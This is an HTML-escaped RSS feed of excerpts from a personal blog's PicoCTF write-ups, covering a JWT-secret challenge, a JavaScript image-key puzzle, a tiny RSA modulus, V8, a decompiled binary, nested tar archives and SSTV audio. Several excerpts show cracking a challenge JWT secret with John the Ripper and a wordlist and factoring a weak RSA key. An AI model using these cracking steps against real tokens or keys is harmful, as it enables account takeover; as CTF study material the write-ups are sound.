&lt;li>Upgrade your &amp;lsquo;role&amp;rsquo; with the new (cracked) JWT. And re-login for the new role to get reflected in browser&amp;rsquo;s localStorage.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題在AIS3 pre-exam的時候也有看到，但當時根本沒想法，只要題目看起來一複雜我就沒辦法分析了，所以還是看了Martin大的WP才知道解法，但有時候真的很考驗耐心，先看hint發現應該是考跟JWT有關&lt;/p></description></item><item><title>PicoCTF - Java Script Kiddie</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-script-kiddie/</guid><description>&lt;h1 id="picoctf---java-script-kiddie">
 PicoCTF - Java Script Kiddie
 &lt;a class="anchor" href="#picoctf---java-script-kiddie">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/jsref/jsref_slice_array.asp">JavaScript Array slice()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fruits&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;Banana&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Orange&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Lemon&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Apple&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Mango&amp;#34;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">citrus&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fruits&lt;/span>.&lt;span style="color:#a6e22e">slice&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">Orange&lt;/span>,&lt;span style="color:#a6e22e">Lemon&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/javascript-uint8array-from-method/">JavaScript Uint8Array.from() Method&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">Uint8Array&lt;/span>.&lt;span style="color:#a6e22e">from&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;45465768654323456&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">array&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">Uint8Array&lt;/span>(&lt;span style="color:#ae81ff">17&lt;/span>) [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">7&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;p>&lt;a href="https://www.w3schools.com/jsref/jsref_fromcharcode.asp">JavaScript String.fromCharCode()&lt;/a>&lt;/p>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">text&lt;/span> &lt;span style="color:#f92672">=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>(&lt;span style="color:#ae81ff">65&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">text&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">#&lt;/span> &lt;span style="color:#a6e22e">output&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">A&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-htmlmixed=" data-lang="htmlmixed=">&amp;lt;html&amp;gt;
	&amp;lt;head&amp;gt; 
		&amp;lt;script src=&amp;#34;jquery-3.3.1.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
		&amp;lt;script&amp;gt;
			var bytes = [];
			$.get(&amp;#34;bytes&amp;#34;, function(resp) {
				bytes = Array.from(resp.split(&amp;#34; &amp;#34;), x =&amp;gt; Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = &amp;#34;0000000000000000&amp;#34;;
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i &amp;lt; LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j &amp;lt; (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById(&amp;#34;Area&amp;#34;).src = &amp;#34;data:image/png;base64,&amp;#34; + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}
		&amp;lt;/script&amp;gt;
	&amp;lt;/head&amp;gt;
	&amp;lt;body&amp;gt;

		&amp;lt;center&amp;gt;
			&amp;lt;form action=&amp;#34;#&amp;#34; onsubmit=&amp;#34;assemble_png(document.getElementById(&amp;#39;user_in&amp;#39;).value)&amp;#34;&amp;gt;
				&amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;user_in&amp;#34;&amp;gt;
				&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
			&amp;lt;/form&amp;gt;
			&amp;lt;img id=&amp;#34;Area&amp;#34; src=&amp;#34;&amp;#34;/&amp;gt;
		&amp;lt;/center&amp;gt;

	&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - JaWT Scratchpad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jawt-scratchpad/</guid><description>&lt;h1 id="picoctf---jawt-scratchpad">
 PicoCTF - JaWT Scratchpad
 &lt;a class="anchor" href="#picoctf---jawt-scratchpad">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c">NTUCNS - HW3 - JWT Authentication&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示：
&lt;img src="https://hackmd.io/_uploads/S1B-01POh.png" alt="" />&lt;/p>
&lt;p>也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用&lt;a href="https://github.com/magnumripper/JohnTheRipper">John&lt;/a>，看起來就是用john-the-ripper解出token password&lt;/p>
&lt;h2 id="exploit---brute-force">
 Exploit - Brute Force
 &lt;a class="anchor" href="#exploit---brute-force">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Brute Force Password&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ cat jwt.txt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8%
$ ./john.exe ../jwt.txt --wordlist=../rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
ilovepico (?)
1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71
Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably
Session completed
&lt;/code>&lt;/pre>&lt;p>Token Password: &lt;code>ilovepico&lt;/code>&lt;/p></description></item><item><title>PicoCTF - john_pollard</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/</guid><description>&lt;h1 id="picoctf---john_pollard">
 PicoCTF - john_pollard
 &lt;a class="anchor" href="#picoctf---john_pollard">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.mkssoftware.com/docs/man1/openssl_rsa.1.asp">openssl - rsa&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>-----BEGIN CERTIFICATE-----
MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe
Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D
VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT
B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI
hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH
al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA
eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO
T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1
BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt
b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz
q16/S1WLvzg4PsElmv1f
-----END CERTIFICATE-----
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Hint 1: The flag is in the format picoCTF{p,q}&lt;/li>
&lt;li>Hint 2: Try swapping p and q if it does not work
這一題就只是把certificate解出來，發現n超小，所以就直接&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---openssl">
 Exploit - openssl
 &lt;a class="anchor" href="#exploit---openssl">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ openssl openssl x509 -in cert -pubkey -noout &amp;gt; public.pem
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----BEGIN PUBLIC KEY-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----END PUBLIC KEY-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ openssl rsa -pubin -in public.pem -text
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RSA Public-Key: &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">53&lt;/span> bit&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Modulus: &lt;span style="color:#ae81ff">4966306421059967&lt;/span> &lt;span style="color:#f92672">(&lt;/span>0x11a4d45212b17f&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exponent: &lt;span style="color:#ae81ff">65537&lt;/span> &lt;span style="color:#f92672">(&lt;/span>0x10001&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>writing RSA key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----BEGIN PUBLIC KEY-----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-----END PUBLIC KEY-----
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Use &lt;a href="https://www.alpertron.com/ECM.HTM">online tool&lt;/a> to factor
p = &lt;code>67867967&lt;/code>
q = &lt;code>73176001&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Kit Engine</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---kit-engine/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---kit-engine/</guid><description>&lt;h1 id="picoctf---kit-engine">
 PicoCTF - Kit Engine
 &lt;a class="anchor" href="#picoctf---kit-engine">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10216397">Google V8 Engine&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://v8.dev/docs/d8">Using d8&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>d8 is V8’s own developer shell.&lt;/p>
&lt;p>d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the &amp;ndash;help argument for more information about usage and flags.&lt;/p></description></item><item><title>PicoCTF - Let's get dynamic</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/</guid><description>&lt;h1 id="picoctf---lets-get-dynamic">
 PicoCTF - Let&amp;rsquo;s get dynamic
 &lt;a class="anchor" href="#picoctf---lets-get-dynamic">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int i; // [rsp+1Ch] [rbp-114h]
 char s2[64]; // [rsp+20h] [rbp-110h] BYREF
 char s[64]; // [rsp+60h] [rbp-D0h] BYREF
 char v7[8]; // [rsp+A0h] [rbp-90h] BYREF
 __int64 v8; // [rsp+A8h] [rbp-88h]
 __int64 v9; // [rsp+B0h] [rbp-80h]
 __int64 v10; // [rsp+B8h] [rbp-78h]
 __int64 v11; // [rsp+C0h] [rbp-70h]
 __int64 v12; // [rsp+C8h] [rbp-68h]
 __int16 v13; // [rsp+D0h] [rbp-60h]
 __int64 v14[6]; // [rsp+E0h] [rbp-50h]
 __int16 v15; // [rsp+110h] [rbp-20h]
 unsigned __int64 v16; // [rsp+118h] [rbp-18h]

 v16 = __readfsqword(0x28u);
 *v7 = 0xFD872AC7CA737102LL;
 v8 = 0x4915F12BF9F82DCBLL;
 v9 = 0xA7EF0D4C54003C10LL;
 v10 = 0x9399CCF74D02A843LL;
 v11 = 0x2AC6F818989688D7LL;
 v12 = 0x9F51EBCA33584C85LL;
 v13 = 231;
 v14[0] = 0x92D46893B5010A61LL;
 v14[1] = 0xA6BDE59D58F4EB4LL;
 v14[2] = 0xFC993A3238355027LL;
 v14[3] = 0xEDA7B28D7054D179LL;
 v14[4] = 0x419FBB499BD4CFBBLL;
 v14[5] = 0x935AE3903F554688LL;
 v15 = 185;
 fgets(s, 49, _bss_start);
 for ( i = 0; i &amp;lt; strlen(v7); ++i )
 s2[i] = *(v14 + i) ^ v7[i] ^ i ^ 0x13;
 if ( !memcmp(s, s2, 49uLL) )
 {
 puts(&amp;#34;No, that&amp;#39;s not right.&amp;#34;);
 return 1;
 }
 else
 {
 puts(&amp;#34;Correct! You entered the flag.&amp;#34;);
 return 0;
 }
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - like1000</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---like1000/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---like1000/</guid><description>&lt;h1 id="picoctf---like1000">
 PicoCTF - like1000
 &lt;a class="anchor" href="#picoctf---like1000">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="">like1000&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://stackoverflow.com/questions/2778153/how-to-extract-nested-tar-gz-files-easily">How to extract nested tar.gz files easily?&lt;/a>
&lt;a href="https://ithelp.ithome.com.tw/articles/10132603">Shell Script - While&lt;/a>&lt;/p>
&lt;h2 id="exploit---untar-1000-times">
 Exploit - Untar 1000 times
 &lt;a class="anchor" href="#exploit---untar-1000-times">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>For untar folders
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">#! /bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
file_name=1000
for next in ${file_name}.tar
while [ $file_name &amp;gt; 1 ]
 do
 echo &amp;#34;Untaring - $file_name&amp;#34;
 tar -xvf ${file_name}.tar #-C ./
 file_name=$(($file_name-1))
 mkdir ./$file_name
 mv ${file_name}.tar ./$file_name
 cd ./${file_name}
 done
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>For getting flag
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">#! /bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
file_name=999
while [ &amp;#34;$file_name&amp;#34; &amp;gt; &amp;#34;0&amp;#34; ]
 do
 cd ./${file_name}
 file_name=$(($file_name-1))
 if [ &amp;#34;$file_name&amp;#34; == &amp;#34;0&amp;#34; ]
 then ls -al
 cat filler.txt
 mv flag.png ~/CTF/PicoCTF/Misc/like1000
 fi
 done
exit 0
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://shengyu7697.github.io/shell-script-arithmetic/">Shell Script 變數相加&lt;/a>
&lt;a href="https://linuxhint.com/solve-gzip-stdin-not-gzip-format-error/">How to solve gzip: stdin: not in gzip format error&lt;/a>
&lt;a href="https://blog.csdn.net/cp_panda_5/article/details/79192688">解压缩报错tar: Error is not recoverable: exiting now&lt;/a>
&lt;a href="https://unix.stackexchange.com/questions/47584/in-a-bash-script-using-the-conditional-or-in-an-if-statement">In a bash script, using the conditional &amp;ldquo;or&amp;rdquo; in an &amp;ldquo;if&amp;rdquo; statement&lt;/a>&lt;/p></description></item><item><title>PicoCTF - m00nwalk</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/</guid><description>&lt;h1 id="picoctf---m00nwalk">
 PicoCTF - m00nwalk
 &lt;a class="anchor" href="#picoctf---m00nwalk">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/26?category=4&amp;amp;page=3">m00nwalk&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>Decode this &lt;a href="https://jupiter.challenges.picoctf.org/static/fc1edf07742e98a480c6aff7d2546107/message.wav">message&lt;/a> from the moon.
Hint:&lt;/p>
&lt;ul>
&lt;li>How did pictures from the moon landing get sent back to Earth?&lt;/li>
&lt;li>What is the CMU mascot?, that might help select a RX option&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://zh.wikipedia.org/wiki/%E6%85%A2%E6%89%AB%E6%8F%8F%E7%94%B5%E8%A7%86#%E5%9C%A8%E8%88%AA%E5%A4%A9%E9%A2%86%E5%9F%9F%E7%9A%84%E6%97%A9%E6%9C%9F%E5%BA%94%E7%94%A8">慢掃描電視 - slow-scan television(sstv)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit---qsstv-">
 Exploit - qsstv +
 &lt;a class="anchor" href="#exploit---qsstv-">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>First, I thought it might be a &lt;code>mp3stego&lt;/code> problem but found nothing. So, I tried to find the write up about this question.&lt;/li>
&lt;li>Use QSSTV
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo apt-get install pavucontrol
$ sudo apt-get install qsstv
$ pactl load-module module-null-sink sink_name=virtual-cable
22
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>The Setting&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;p>&lt;code>pavucontrol&lt;/code>&lt;/p></description></item><item><title>PicoCTF - m00nwalk2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/</guid><description>&lt;h1 id="picoctf---m00nwalk2">
 PicoCTF - m00nwalk2
 &lt;a class="anchor" href="#picoctf---m00nwalk2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice?category=4&amp;amp;page=3">m00nwalk2&lt;/a>&lt;/p>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;p>Revisit the last transmission. We think this &lt;a href="https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/message.wav">transmission&lt;/a> contains a hidden message. There are also some clues &lt;a href="https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/clue1.wav">clue 1&lt;/a>, &lt;a href="https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/clue2.wav">clue 2&lt;/a>, &lt;a href="https://jupiter.challenges.picoctf.org/static/a33c9e5dae30c560704e6f2ffaba35c7/clue3.wav">clue 3&lt;/a>.&lt;/p>
&lt;p>Hint:&lt;/p>
&lt;ul>
&lt;li>Use the clues to extract the another flag from the .wav file&lt;/li>
&lt;/ul>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/rrUS4fS8QxicWvvjqziIqg">m00nwalk&lt;/a>&lt;/p>
&lt;h2 id="exploit---qsstv">
 Exploit - QSSTV
 &lt;a class="anchor" href="#exploit---qsstv">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Follow the write up of m00nwalk then you&amp;rsquo;ll get 3 images from 3 clues respectively.
&lt;img src="https://i.imgur.com/Vq8ciM2.png" alt="" />
&lt;img src="https://i.imgur.com/Y5nS8wS.png" alt="" />
&lt;img src="https://i.imgur.com/C0xk8YL.png" alt="" />&lt;/p></description></item><item><title>PicoCTF - MacroHard WeakEdge</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/</guid><description>&lt;h1 id="picoctf---macrohard-weakedge">
 PicoCTF - MacroHard WeakEdge
 &lt;a class="anchor" href="#picoctf---macrohard-weakedge">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/130?bookmarked=0&amp;amp;category=4&amp;amp;page=1&amp;amp;search=&amp;amp;solved=0">MacroHard WeakEdge&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
